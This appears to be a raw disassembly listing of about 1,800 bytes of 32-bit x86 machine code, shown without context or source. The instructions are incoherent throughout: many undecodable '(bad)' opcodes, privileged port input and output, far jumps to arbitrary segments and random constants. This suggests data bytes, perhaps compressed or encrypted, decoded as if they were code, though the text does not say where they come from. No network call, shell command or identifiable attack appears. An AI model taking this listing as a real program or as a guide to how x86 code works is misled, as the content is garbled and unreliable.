  41d134:	mov    bh,0x89
  41d136:	in     al,dx
  41d137:	scas   al,BYTE PTR es:[edi]
  41d138:	aam    0x80
  41d13a:	adc    DWORD PTR [eax-0x53],0x81572fb6
  41d141:	inc    esi
  41d142:	ins    BYTE PTR es:[edi],dx
  41d143:	dec    esi
  41d144:	fld    QWORD PTR [ecx]
  41d146:	and    dh,BYTE PTR [edx]
  41d148:	lods   al,BYTE PTR ds:[esi]
  41d149:	movsx  edi,BYTE PTR [ecx]
  41d14c:	(bad)  
  41d14d:	adc    eax,0x4e10c44f
  41d152:	fisttp DWORD PTR [eax]
  41d154:	fnstsw WORD PTR [ebx+esi*4+0x46]
  41d158:	adc    BYTE PTR [ecx-0x4e8beab5],ah
  41d15e:	mov    esp,DWORD PTR [edx+0x24ede4dd]
  41d164:	jl     0x41d179
  41d166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d167:	add    cl,al
  41d169:	aaa    
  41d16a:	adc    al,0x11
  41d16c:	and    BYTE PTR [ebx-0x380ef1bd],bl
  41d172:	adc    eax,0xe837ad6a
  41d177:	mov    ebx,0x70cb4b5e
  41d17c:	out    0xa9,eax
  41d17e:	add    dh,dl
  41d180:	enter  0xf110,0xdd
  41d184:	cmp    BYTE PTR [ecx],0x6
  41d187:	mov    esi,0x239eae77
  41d18c:	mov    cl,BYTE PTR [esi+0x18]
  41d18f:	and    eax,0x4470a115
  41d194:	bound  ebp,QWORD PTR [esi+0x2856f277]
  41d19a:	push   edi
  41d19b:	sub    ebx,eax
  41d19d:	aad    0xb6
  41d19f:	jnp    0x41d211
  41d1a1:	push   edi
  41d1a2:	aas    
  41d1a3:	inc    edx
  41d1a4:	ds dec esi
  41d1a6:	pop    eax
  41d1a7:	popa   
  41d1a8:	aaa    
  41d1a9:	(bad)  
  41d1aa:	sar    dh,1
  41d1ac:	out    0x3d,eax
  41d1ae:	push   0xb21179bd
  41d1b3:	add    ch,BYTE PTR [ebx-0x3cd7247]
  41d1b9:	sub    bh,ah
  41d1bb:	ins    DWORD PTR es:[edi],dx
  41d1bc:	aaa    
  41d1bd:	mov    ebp,0x39f185ef
  41d1c2:	push   esi
  41d1c3:	jg     0x41d179
  41d1c5:	mov    ah,0xfb
  41d1c7:	inc    eax
  41d1c8:	pop    ebp
  41d1c9:	jmp    0x41d1fa
  41d1cb:	xor    BYTE PTR [ecx],0x4e
  41d1ce:	xchg   esp,eax
  41d1cf:	jp     0x41d21e
  41d1d1:	cmc    
  41d1d2:	retf   
  41d1d3:	pop    es
  41d1d4:	adc    BYTE PTR [ebx+0x13],ch
  41d1d7:	stos   BYTE PTR es:[edi],al
  41d1d8:	jnp    0x41d1a5
  41d1da:	sub    cl,bh
  41d1dc:	sub    esi,edi
  41d1de:	jmp    0x41d1bb
  41d1e0:	pop    esp
  41d1e1:	mov    ds:0x584d8a3a,al
  41d1e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1e7:	and    DWORD PTR [eax-0x66],edx
  41d1ea:	dec    ecx
  41d1eb:	repnz mov WORD PTR [ebx-0x5c],fs
  41d1ef:	mov    ds:0x9d09a306,al
  41d1f4:	mov    ebp,0xadb5a359
  41d1f9:	enter  0x9472,0x36
  41d1fd:	mov    BYTE PTR [ecx+0x7b],ah
  41d200:	ins    DWORD PTR es:[edi],dx
  41d201:	pop    es
  41d202:	in     eax,0xda
  41d204:	arpl   bp,si
  41d206:	jge    0x41d255
  41d208:	pop    ds
  41d209:	bound  edx,QWORD PTR [esi+0x5]
  41d20c:	repz icebp 
  41d20e:	repz mov cl,0x1a
  41d211:	ja     0x41d221
  41d213:	lock retf 0x194e
  41d217:	mov    edx,DWORD PTR [esi-0x4738d74c]
  41d21d:	(bad)  
  41d21e:	xor    esp,DWORD PTR [edx+edi*4-0x8]
  41d222:	sbb    al,0xd4
  41d224:	fscale 
  41d226:	adc    eax,0xf1356e61
  41d22b:	cmp    bl,BYTE PTR [ecx+edi*1-0x3b8d5765]
  41d232:	icebp  
  41d233:	nop
  41d234:	ficom  WORD PTR [ebx]
  41d236:	mov    al,ds:0xabdba46b
  41d23b:	loop   0x41d2a5
  41d23d:	adc    eax,edi
  41d23f:	arpl   WORD PTR [edx],si
  41d241:	jle    0x41d1f7
  41d243:	mov    ds:0x892f3019,al
  41d248:	mov    DWORD PTR [edi+esi*4+0x10],esp
  41d24c:	ret    
  41d24d:	cmp    DWORD PTR [ebx+0x22],eax
  41d250:	xchg   dh,dh
  41d252:	in     eax,dx
  41d253:	ins    DWORD PTR es:[edi],dx
  41d254:	ror    ch,0x94
  41d257:	das    
  41d258:	lds    eax,FWORD PTR [ecx+ecx*2+0x10]
  41d25c:	mov    ah,0x55
  41d25e:	rcr    WORD PTR [edx],1
  41d261:	stos   DWORD PTR es:[edi],eax
  41d262:	sub    dl,BYTE PTR [edi+0x52]
  41d265:	setne  BYTE PTR [edi+0x27]
  41d269:	hlt    
  41d26a:	sbb    dh,BYTE PTR [ebx+0x1a6f330a]
  41d270:	shr    BYTE PTR [edx+eax*4+0x10],cl
  41d274:	imul   BYTE PTR [esi-0x57e58544]
  41d27a:	mov    ch,dh
  41d27c:	add    ecx,edi
  41d27e:	jns    0x41d29d
  41d280:	push   ecx
  41d281:	mov    al,fs:0x1298a825
  41d287:	enter  0xb512,0x37
  41d28b:	es inc ebx
  41d28d:	test   BYTE PTR [esi],dh
  41d28f:	jg     0x41d2f9
  41d291:	mov    cl,0x5b
  41d293:	addr16 (bad) 
  41d295:	sbb    edx,DWORD PTR [edx+0x18]
  41d298:	jno    0x41d270
  41d29a:	pop    ds
  41d29b:	and    ecx,DWORD PTR [ecx+0x38b0a153]
  41d2a1:	cmp    edi,DWORD PTR [edi-0x70af9aa]
  41d2a7:	fld    QWORD PTR [ebp-0x2f86eb3d]
  41d2ad:	mov    bh,0x8c
  41d2af:	adc    al,bh
  41d2b1:	enter  0x2653,0x9e
  41d2b5:	loope  0x41d336
  41d2b7:	retf   
  41d2b8:	ds xchg ebp,eax
  41d2ba:	popa   
  41d2bb:	sar    BYTE PTR ds:0xed69c9f6,cl
  41d2c1:	cmp    bl,BYTE PTR [ecx]
  41d2c3:	nop
  41d2c4:	repz dec esp
  41d2c6:	test   eax,0xb7eda599
  41d2cb:	je     0x41d2da
  41d2cd:	fprem  
  41d2cf:	retf   0x4d8
  41d2d2:	lds    eax,FWORD PTR [ebx+0x22]
  41d2d5:	sbb    BYTE PTR [ebp-0x7f],dh
  41d2d8:	xchg   esi,eax
  41d2d9:	in     eax,0xe7
  41d2db:	pop    esp
  41d2dc:	xchg   BYTE PTR [esi-0x35],dl
  41d2df:	inc    edx
  41d2e0:	mov    ecx,0x6cf563ad
  41d2e5:	inc    ebx
  41d2e6:	jbe    0x41d2d3
  41d2e8:	pushf  
  41d2e9:	loopne 0x41d2d6
  41d2eb:	xchg   DWORD PTR [ebp+0x3d76221c],edi
  41d2f1:	or     dl,BYTE PTR [edx]
  41d2f3:	(bad)  
  41d2f4:	ja     0x41d2ed
  41d2f6:	mov    ecx,0x69cfee92
  41d2fb:	(bad)  
  41d2fc:	sahf   
  41d2fd:	mov    cl,0xa3
  41d2ff:	pop    esi
  41d300:	cmp    edi,DWORD PTR [edx+0x67c472c5]
  41d306:	shl    BYTE PTR ss:[eax],0x53
  41d30a:	xchg   edi,eax
  41d30b:	ret    
  41d30c:	inc    ebp
  41d30d:	test   DWORD PTR [edx+0x1956cd34],ebp
  41d313:	pop    ecx
  41d314:	mov    eax,ds:0xffb99d54
  41d319:	dec    esi
  41d31a:	mov    dh,0x34
  41d31c:	jmp    0xfb30:0x9a558d5d
  41d323:	sub    eax,ebp
  41d325:	leave  
  41d326:	mov    eax,ds:0xafc7fedf
  41d32b:	jno    0x41d2e2
  41d32d:	loopne 0x41d33c
  41d32f:	std    
  41d330:	pop    esp
  41d331:	popf   
  41d332:	mov    ebx,0x8832d555
  41d337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d338:	cmc    
  41d339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d33a:	dec    eax
  41d33b:	pop    esp
  41d33c:	js     0x41d380
  41d33e:	mov    al,0x83
  41d340:	push   ss
  41d341:	mov    dh,0x29
  41d343:	sub    DWORD PTR [edx+0x76ba555c],edx
  41d349:	neg    DWORD PTR [ebp+ebx*4+0x67]
  41d34d:	out    dx,eax
  41d34e:	fisttp DWORD PTR [ebp-0x51]
  41d351:	push   edx
  41d352:	add    dl,BYTE PTR [ebx+eax*4+0xd]
  41d356:	(bad)  
  41d357:	lods   al,BYTE PTR ds:[esi]
  41d358:	jbe    0x41d31c
  41d35a:	cwde   
  41d35b:	add    DWORD PTR [ebx-0x16818cc1],edi
  41d361:	cld    
  41d362:	dec    ebx
  41d363:	dec    edx
  41d364:	add    BYTE PTR [edi],cl
  41d366:	xor    dh,bh
  41d368:	pusha  
  41d369:	jp     0x41d392
  41d36b:	pop    edi
  41d36c:	into   
  41d36d:	retf   
  41d36e:	scas   eax,DWORD PTR es:[edi]
  41d36f:	loop   0x41d35f
  41d371:	icebp  
  41d372:	push   ds
  41d373:	sub    al,0x9e
  41d375:	mov    bh,0x45
  41d377:	arpl   WORD PTR [ecx+edi*4-0x288bd74c],dx
  41d37e:	scas   eax,DWORD PTR es:[edi]
  41d37f:	stos   BYTE PTR es:[edi],al
  41d380:	cmp    BYTE PTR [ecx],dl
  41d382:	mov    esi,cs
  41d384:	shr    ecx,0x8e
  41d387:	mov    dh,0xc4
  41d389:	cwde   
  41d38a:	not    BYTE PTR [ebp+0x65]
  41d38d:	mov    DWORD PTR [edx+edx*2],ebx
  41d390:	inc    ebp
  41d391:	imul   edi,DWORD PTR [edx],0x6c
  41d394:	stos   BYTE PTR es:[edi],al
  41d395:	sar    esi,1
  41d397:	stos   BYTE PTR es:[edi],al
  41d398:	inc    esp
  41d399:	xor    BYTE PTR [edi-0x35e43a34],bh
  41d39f:	sahf   
  41d3a0:	push   ds
  41d3a1:	xchg   ecx,eax
  41d3a2:	pusha  
  41d3a3:	sbb    ch,BYTE PTR [ecx]
  41d3a5:	or     al,0x45
  41d3a7:	jecxz  0x41d3c2
  41d3a9:	cdq    
  41d3aa:	mov    al,0x35
  41d3ac:	imul   ebp,ebp,0xfffffff7
  41d3af:	push   eax
  41d3b0:	add    cl,BYTE PTR [ecx+0x607b1ee6]
  41d3b6:	inc    edi
  41d3b7:	in     al,dx
  41d3b8:	push   ss
  41d3b9:	fistp  DWORD PTR [esp+ebp*2]
  41d3bc:	test   BYTE PTR [ebx+eax*1],dh
  41d3bf:	jo     0x41d41f
  41d3c1:	xchg   edi,eax
  41d3c2:	iret   
  41d3c3:	dec    esp
  41d3c4:	popa   
  41d3c5:	jo     0x41d3d4
  41d3c7:	test   BYTE PTR [eax-0x2f5a90f],dh
  41d3cd:	mov    ds:0x49d8d402,eax
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	ret    0x67fe
  41d3d6:	cmp    BYTE PTR [edx+edi*4-0x5d],ah
  41d3da:	sti    
  41d3db:	dec    esi
  41d3dc:	mov    ch,0xf6
  41d3de:	cmp    eax,0x44e1c3e5
  41d3e3:	frstor [ebx]
  41d3e5:	mov    ebx,esi
  41d3e7:	shl    BYTE PTR [eax+esi*4],0x2e
  41d3eb:	sbb    ebx,DWORD PTR [esi+esi*8-0x62]
  41d3ef:	push   eax
  41d3f0:	stc    
  41d3f1:	adc    al,0x39
  41d3f3:	jle    0x41d416
  41d3f5:	jge    0x41d3fb
  41d3f7:	push   eax
  41d3f8:	xor    al,0x30
  41d3fa:	sbb    DWORD PTR [edx+0x27ad88a4],edi
  41d400:	pop    ss
  41d401:	and    ebp,eax
  41d403:	add    dh,ah
  41d405:	adc    al,0x14
  41d407:	cmp    DWORD PTR [ecx+0x2f],ebx
  41d40a:	clc    
  41d40b:	xchg   BYTE PTR [eax+0x2ed85fb3],bl
  41d411:	lods   al,BYTE PTR ds:[esi]
  41d412:	xor    BYTE PTR ds:0x1f000f4f,0xb7
  41d419:	mov    eax,ds:0x4d0e7f95
  41d41e:	push   ecx
  41d41f:	ret    0x6c76
  41d422:	cmp    bl,dh
  41d424:	or     DWORD PTR fs:[bx+di+0x5c],eax
  41d429:	fistp  DWORD PTR [edi-0x2086f3ef]
  41d42f:	cmp    BYTE PTR [edx-0xe11bbdf],0x1e
  41d436:	or     al,0xfa
  41d438:	inc    edi
  41d439:	inc    ecx
  41d43a:	out    0x89,eax
  41d43c:	cmp    eax,DWORD PTR [esi+0x42e060e2]
  41d442:	mul    BYTE PTR [esi-0x45]
  41d445:	frstor [edi-0x54]
  41d448:	scas   eax,DWORD PTR es:[edi]
  41d449:	shl    DWORD PTR [si],cl
  41d44c:	ja     0x41d416
  41d44e:	xor    al,0xf9
  41d450:	mov    ds:0xb4e2eb17,eax
  41d456:	sub    DWORD PTR [ebx-0x76],0xfb7c1134
  41d45d:	xor    al,0x5c
  41d45f:	stos   BYTE PTR es:[edi],al
  41d460:	and    ecx,ecx
  41d462:	fs cmc 
  41d464:	ret    0x6fe4
  41d467:	cmc    
  41d468:	xor    al,0xb7
  41d46a:	test   eax,0x3741d897
  41d46f:	aad    0xad
  41d471:	mov    ch,BYTE PTR gs:[edx]
  41d474:	pop    esi
  41d475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d476:	mov    bl,0x83
  41d478:	(bad)  
  41d479:	dec    edx
  41d47a:	fidivr DWORD PTR [eax+0x59]
  41d47d:	adc    al,0x4b
  41d47f:	sub    al,0xd6
  41d481:	xlat   BYTE PTR ds:[ebx]
  41d482:	xor    al,cl
  41d484:	call   0x7a2b0f48
  41d489:	xor    dl,BYTE PTR [ebx+0x75]
  41d48c:	xor    ecx,DWORD PTR [ebp+ebx*4+0x69]
  41d490:	ja     0x41d494
  41d492:	mov    bl,0xda
  41d494:	mov    al,0xea
  41d496:	out    0x97,eax
  41d498:	cmp    eax,0xbb23124e
  41d49d:	sbb    ch,dl
  41d49f:	adc    DWORD PTR [edx+0x2ef66714],ebx
  41d4a5:	pusha  
  41d4a6:	sub    BYTE PTR [edi+0x1a],0x19
  41d4aa:	mov    eax,0x5129ac58
  41d4af:	push   cs
  41d4b0:	add    ch,ch
  41d4b2:	out    dx,eax
  41d4b3:	rcr    DWORD PTR ds:0x51815ad6,1
  41d4b9:	push   cs
  41d4ba:	sti    
  41d4bb:	mov    dh,0x3f
  41d4bd:	(bad)  
  41d4be:	hlt    
  41d4bf:	test   DWORD PTR [eax-0x413ac845],ebx
  41d4c5:	and    DWORD PTR [ecx-0x18],ebp
  41d4c8:	leave  
  41d4c9:	xor    bh,bh
  41d4cb:	mov    ch,0x81
  41d4cd:	rcl    BYTE PTR [edx+0x3a],cl
  41d4d0:	xor    eax,0xe59db3f4
  41d4d5:	fwait
  41d4d6:	ja     0x41d480
  41d4d8:	shr    BYTE PTR [ecx],cl
  41d4da:	mov    bh,0xc8
  41d4dc:	jl     0x41d4e7
  41d4de:	jmp    0x2049:0xf1df2330
  41d4e5:	les    edx,FWORD PTR gs:[ebp+0x16]
  41d4e9:	push   esp
  41d4ea:	or     al,0x24
  41d4ec:	out    0x1b,al
  41d4ee:	xlat   BYTE PTR ds:[ebx]
  41d4ef:	pop    es
  41d4f0:	icebp  
  41d4f1:	out    dx,eax
  41d4f2:	in     eax,0x84
  41d4f4:	rol    DWORD PTR [ebp-0x4c],0x55
  41d4f8:	rcl    BYTE PTR [ecx-0xa],0x3b
  41d4fc:	mov    ebx,0xf675371
  41d501:	(bad)  
  41d502:	inc    DWORD PTR [edi]
  41d504:	test   eax,0x4a72f0ab
  41d509:	jle    0x41d563
  41d50b:	pop    ds
  41d50c:	pop    ebx
  41d50d:	int    0x27
  41d50f:	dec    edi
  41d510:	dec    edx
  41d511:	repz add esi,esp
  41d514:	fstp   QWORD PTR [ebx+0x36]
  41d517:	push   ebp
  41d518:	jno    0x41d4d8
  41d51a:	leave  
  41d51b:	sub    eax,0xf88caa9e
  41d520:	xor    al,al
  41d522:	sbb    al,0xed
  41d524:	jg     0x41d4fb
  41d526:	push   ecx
  41d527:	adc    esp,DWORD PTR [edx-0xa731d22]
  41d52d:	out    dx,al
  41d52e:	fwait
  41d52f:	mov    ah,dh
  41d531:	or     DWORD PTR [eax],ecx
  41d533:	iret   
  41d534:	or     BYTE PTR [edx],ch
  41d536:	fimul  WORD PTR [eax]
  41d538:	sar    DWORD PTR [edx+0x70],1
  41d53b:	or     al,0x1f
  41d53d:	jl     0x41d4c8
  41d53f:	out    0x3e,eax
  41d541:	popa   
  41d542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d543:	mov    dl,0xb3
  41d545:	into   
  41d546:	jae    0x41d5b1
  41d548:	mov    edx,0x193a2083
  41d54d:	xchg   edx,eax
  41d54e:	jle    0x41d52b
  41d550:	ror    BYTE PTR [eax+eax*1-0x2b],cl
  41d554:	adc    al,0x4d
  41d556:	add    al,0xa8
  41d558:	test   al,0xd2
  41d55a:	sub    al,0xbc
  41d55c:	pop    esi
  41d55d:	pop    edx
  41d55e:	icebp  
  41d55f:	je     0x41d4fc
  41d561:	test   BYTE PTR [ebx+eiz*2],dl
  41d564:	inc    ecx
  41d565:	pop    ss
  41d566:	lds    esp,FWORD PTR [eax+0x58]
  41d569:	arpl   si,ax
  41d56b:	mov    ebp,0xdef34f5b
  41d570:	mov    esi,0x7104d69c
  41d575:	leave  
  41d576:	push   eax
  41d577:	loopne 0x41d5c4
  41d579:	xor    al,0x9e
  41d57b:	mov    edi,0xfa383ab1
  41d580:	ds or  al,0xb5
  41d583:	das    
  41d584:	ds pop ss
  41d586:	dec    DWORD PTR [esi-0x68e27c72]
  41d58c:	cld    
  41d58d:	or     al,0x89
  41d58f:	mov    ds:0x5f970645,eax
  41d594:	adc    al,0xa1
  41d596:	sub    eax,0x27b0e687
  41d59b:	dec    edi
  41d59c:	mov    dl,BYTE PTR [esi+0x70]
  41d59f:	mov    WORD PTR [ecx-0x71],ds
  41d5a2:	lock pop ebp
  41d5a4:	out    dx,eax
  41d5a5:	dec    esp
  41d5a6:	mov    ch,0xc1
  41d5a8:	call   0xc852ac41
  41d5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5ae:	mov    dl,0xb1
  41d5b0:	push   esi
  41d5b1:	mov    cl,0x38
  41d5b3:	call   0x8ff17462
  41d5b8:	popf   
  41d5b9:	jecxz  0x41d626
  41d5bb:	and    al,0xe9
  41d5bd:	mov    al,ds:0xb599cb2f
  41d5c2:	jmp    0x68c0:0xde8475c0
  41d5c9:	xor    DWORD PTR [esi-0x41],edx
  41d5cc:	cmp    al,0x85
  41d5ce:	mov    ebx,DWORD PTR [eax]
  41d5d0:	(bad)  
  41d5d1:	aad    0x39
  41d5d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5d4:	push   ebp
  41d5d5:	scas   al,BYTE PTR es:[edi]
  41d5d6:	or     BYTE PTR ds:0xb96ff77c,cl
  41d5dc:	rcr    BYTE PTR [edx-0x5b],1
  41d5df:	mov    ebp,0xdea2dd0d
  41d5e4:	sahf   
  41d5e5:	sti    
  41d5e6:	push   0xffffff84
  41d5e8:	dec    ebx
  41d5e9:	and    dh,BYTE PTR [esi+0x44d3276d]
  41d5ef:	ficom  WORD PTR [edx]
  41d5f1:	test   eax,0x3ab7d949
  41d5f6:	jbe    0x41d677
  41d5f8:	scas   al,BYTE PTR es:[edi]
  41d5f9:	and    al,0x6c
  41d5fb:	or     ebp,edi
  41d5fd:	outs   dx,BYTE PTR ds:[esi]
  41d5fe:	cld    
  41d5ff:	dec    ecx
  41d600:	sub    eax,ecx
  41d602:	rcr    DWORD PTR [edi+esi*4],1
  41d605:	xor    al,0x23
  41d607:	arpl   WORD PTR [ebx],cx
  41d609:	mov    edx,0x9c6aeee
  41d60e:	int3   
  41d60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d610:	or     BYTE PTR [esi-0x26],dl
  41d613:	cmp    BYTE PTR [esi+0x7afc414c],cl
  41d619:	int    0xf5
  41d61b:	out    dx,eax
  41d61c:	sti    
  41d61d:	xor    ah,BYTE PTR [edx+0x41]
  41d620:	sub    DWORD PTR [esi+ecx*2-0x1f],esp
  41d624:	pop    esi
  41d625:	mov    BYTE PTR [eax],dh
  41d627:	mov    eax,0xd8bc8138
  41d62c:	loope  0x41d63c
  41d62e:	daa    
  41d62f:	adc    esi,eax
  41d631:	out    dx,al
  41d632:	xor    eax,0x67913ba0
  41d637:	dec    esp
  41d638:	mov    al,ds:0x7fa75464
  41d63d:	jbe    0x41d5f9
  41d63f:	adc    eax,0x70dba37f
  41d644:	cmp    dh,al
  41d646:	aad    0xec
  41d648:	test   BYTE PTR [ebp+edx*8-0x733245d1],dl
  41d64f:	int3   
  41d650:	(bad)  
  41d651:	jne    0x41d67f
  41d653:	sub    ah,cl
  41d655:	cmp    BYTE PTR [eax],al
  41d657:	xor    al,0xe1
  41d659:	lea    eax,[ecx-0x10a4fe49]
  41d65f:	cli    
  41d660:	mov    ds:0xc1c21313,al
  41d665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d666:	int    0x4e
  41d668:	inc    edx
  41d669:	data16 mov bh,0x61
  41d66c:	iret   
  41d66d:	or     al,0x87
  41d66f:	jns    0x41d5f9
  41d671:	jle    0x41d6a3
  41d673:	xchg   edi,eax
  41d674:	jae    0x41d6f0
  41d676:	jp     0x41d6c2
  41d678:	sbb    bh,BYTE PTR [edi+eax*4-0x6b]
  41d67c:	ret    0x903c
  41d67f:	clc    
  41d680:	mov    dh,0x15
  41d682:	scas   eax,DWORD PTR es:[edi]
  41d683:	and    BYTE PTR [ecx+ecx*8],dh
  41d686:	test   DWORD PTR [ecx],ebp
  41d688:	xchg   ecx,eax
  41d689:	push   ecx
  41d68a:	ins    DWORD PTR es:[edi],dx
  41d68b:	add    bl,BYTE PTR [esi-0x6ef67c4c]
  41d691:	pusha  
  41d692:	dec    ebp
  41d693:	pusha  
  41d694:	rcr    eax,0xc0
  41d697:	retf   
  41d698:	loope  0x41d625
  41d69a:	pop    esp
  41d69b:	ja     0x41d64d
  41d69d:	sahf   
  41d69e:	stos   BYTE PTR es:[edi],al
  41d69f:	loop   0x41d715
  41d6a1:	fsubr  QWORD PTR [ebx]
  41d6a3:	out    0xbc,al
  41d6a5:	pop    esp
  41d6a6:	bound  ebp,QWORD PTR [edi-0x22d4214]
  41d6ac:	shr    DWORD PTR [edi+eiz*2+0x2a],1
  41d6b0:	outs   dx,BYTE PTR ds:[esi]
  41d6b1:	sbb    cl,0x8e
  41d6b4:	xor    bl,bh
  41d6b6:	adc    BYTE PTR [esi-0x2a61c5ac],0x90
  41d6bd:	out    0xb,eax
  41d6bf:	mov    eax,ds:0x807f9bf2
  41d6c4:	je     0x41d6ec
  41d6c6:	push   cs
  41d6c7:	pop    ds
  41d6c8:	lahf   
  41d6c9:	mov    WORD PTR [ebp+0x6a],fs
  41d6cc:	inc    ebp
  41d6cd:	cdq    
  41d6ce:	xchg   cx,ax
  41d6d0:	mov    ch,0x48
  41d6d2:	js     0x41d690
  41d6d4:	add    esi,DWORD PTR [edi-0x51]
  41d6d7:	(bad)  
  41d6d8:	cmp    al,0x66
  41d6da:	imul   BYTE PTR [esi]
  41d6dc:	lahf   
  41d6dd:	js     0x41d6b0
  41d6df:	adc    DWORD PTR [eax+eax*8+0x250f1f10],ebx
  41d6e6:	jmp    0xadf6:0x3b19cf7b
  41d6ed:	xchg   esp,eax
  41d6ee:	sub    eax,0x85f78336
  41d6f3:	imul   BYTE PTR [eax-0x4e2bb92d]
  41d6f9:	add    ah,BYTE PTR [ebx+0x40df9ee4]
  41d6ff:	jne    0x41d708
  41d701:	shl    BYTE PTR [ecx+eiz*8-0x64b6fbe8],0x3f
  41d709:	repnz or esi,DWORD PTR [ecx]
  41d70c:	mov    eax,0xd190e756
  41d711:	sub    DWORD PTR ds:0xba6c8411,eax
  41d717:	pop    esp
  41d718:	sub    esp,DWORD PTR [ebp-0x27b41b73]
  41d71e:	and    ecx,DWORD PTR [eax]
  41d720:	adc    al,dl
  41d722:	clc    
  41d723:	mov    bh,0x28
  41d725:	push   ss
  41d726:	sub    BYTE PTR [edx-0x54],ah
  41d729:	jo     0x41d6d5
  41d72b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d72c:	fldenv [edi+0x665f9859]
  41d732:	dec    ebp
  41d733:	push   0xd1d23271
  41d738:	mov    ebp,0xeec3d18b
  41d73d:	sti    
  41d73e:	aam    0xa9
  41d740:	dec    esp
  41d741:	add    bh,BYTE PTR [ebx+0x66bdf7ea]
  41d747:	cmp    BYTE PTR [ebx-0x2ac2bcb],0xc1
  41d74e:	clc    
  41d74f:	xor    bl,BYTE PTR [edi-0xd]
  41d752:	popf   
  41d753:	dec    edi
  41d754:	sub    eax,0x6473838a
  41d759:	in     eax,dx
  41d75a:	jne    0x41d730
  41d75c:	push   cs
  41d75d:	mov    BYTE PTR [ecx+0x569b98a2],bh
  41d763:	fild   WORD PTR [edx]
  41d765:	push   ecx
  41d766:	imul   esi,DWORD PTR es:[ecx-0x50d7a5d3],0xeb04152a
  41d771:	jmp    0xcbf8f148
  41d776:	loop   0x41d755
  41d778:	and    al,0x77
  41d77a:	into   
  41d77b:	sbb    ebp,edi
  41d77d:	dec    ebp
  41d77e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d780:	mov    al,ds:0x1f367a5d
  41d785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d786:	inc    eax
  41d787:	scas   al,BYTE PTR es:[edi]
  41d788:	inc    esi
  41d789:	lods   eax,DWORD PTR ds:[esi]
  41d78a:	xor    esi,DWORD PTR [ecx+0x6d]
  41d78d:	paddw  mm0,mm1
  41d790:	retf   0x9132
  41d793:	popf   
  41d794:	xor    DWORD PTR [ebx],edx
  41d796:	hlt    
  41d797:	dec    esi
  41d798:	pop    ebx
  41d799:	xchg   bl,al
  41d79b:	enter  0x22ba,0xa
  41d79f:	jae    0x41d762
  41d7a1:	sbb    eax,0xdd8c9b72
  41d7a6:	js     0x41d81a
  41d7a8:	adc    edx,DWORD PTR [edi*1+0x4ee66a99]
  41d7af:	sbb    DWORD PTR gs:[edi+0x316decd],ecx
  41d7b6:	out    0x26,al
  41d7b8:	sub    al,0x62
  41d7ba:	jle    0x41d831
  41d7bc:	(bad)  
  41d7bd:	outs   dx,DWORD PTR ds:[esi]
  41d7be:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41d7c0:	pushf  
  41d7c1:	pusha  
  41d7c2:	push   esi
  41d7c3:	lock dec eax
  41d7c5:	or     ch,ch
  41d7c7:	mov    dh,0xa5
  41d7c9:	es das 
  41d7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7cc:	dec    eax
  41d7cd:	jo     0x41d832
  41d7cf:	jl     0x41d779
  41d7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7d2:	push   esi
  41d7d3:	loope  0x41d799
  41d7d5:	xchg   edi,eax
  41d7d6:	jne    0x41d7fd
  41d7d8:	aaa    
  41d7d9:	bound  eax,QWORD PTR [ebp+0x69]
  41d7dc:	mov    edi,0x3201a003
  41d7e1:	(bad)  
  41d7e3:	mov    esi,ss
  41d7e5:	lahf   
  41d7e6:	mov    esi,DWORD PTR [edx]
  41d7e8:	(bad)  
  41d7e9:	cli    
  41d7ea:	mov    ?,WORD PTR [ecx-0x6c]
  41d7ed:	imul   esi,DWORD PTR [edx],0x9481fbe9
  41d7f3:	xor    ah,BYTE PTR [ecx+0x6342f440]
  41d7f9:	dec    ebp
  41d7fa:	leave  
  41d7fb:	push   es
  41d7fc:	jno    0x41d803
  41d7fe:	push   0xa
  41d800:	stos   DWORD PTR es:[edi],eax
  41d801:	cmp    al,0xa0
  41d803:	mov    esi,DWORD PTR [ebx-0x344b714d]
  41d809:	iret   
  41d80a:	jl     0x41d78f
  41d80c:	sub    esp,ebx
  41d80e:	and    eax,edi
  41d810:	pop    ds
  41d811:	adc    DWORD PTR [edx+0x4b],0xffffff97
  41d815:	xor    al,0xbe
  41d817:	repnz sbb eax,0x2023b092
  41d81d:	inc    edx
  41d81e:	sbb    BYTE PTR [edx+0x56],dl
  41d821:	dec    ebp
  41d822:	rcl    DWORD PTR [ebp-0xa326f1f],cl
  41d828:	out    0xca,eax
  41d82a:	sbb    ebx,DWORD PTR [ebx]
  41d82c:	lds    edi,FWORD PTR [ebx+0x20f18fa7]
  41d832:	ins    BYTE PTR es:[edi],dx
  41d833:	ins    BYTE PTR es:[edi],dx
  41d834:	into   
  41d835:	bound  esp,QWORD PTR [ecx+0x58c2e36e]
  41d83b:	push   ss
  41d83c:	in     al,0xf2
  41d83e:	test   al,0xb3
  41d840:	pmaxsw mm0,mm7
  41d843:	fsubp  st(7),st
  41d845:	jle    0x41d853
  41d847:	push   ebp
  41d848:	pop    edx
  41d849:	shr    DWORD PTR [edx+0x6778f325],1
  41d84f:	mov    ecx,0xa23e3e92
  41d854:	pop    ds
  41d855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d856:	sub    eax,0xd2767916
  41d85b:	fnstenv [ebx+edi*8+0x6d]
  41d85f:	pop    ds
  41d860:	xor    BYTE PTR [ebp+0x1cd7045d],ah
  41d866:	add    dh,cl
  41d868:	ds ret 
  41d86a:	pusha  
  41d86b:	xor    al,0xdc
  41d86d:	and    al,0xfc
  41d86f:	jo     0x41d87d
  41d871:	pop    edx
  41d872:	inc    esi
  41d873:	jmp    0xe3c5ec55
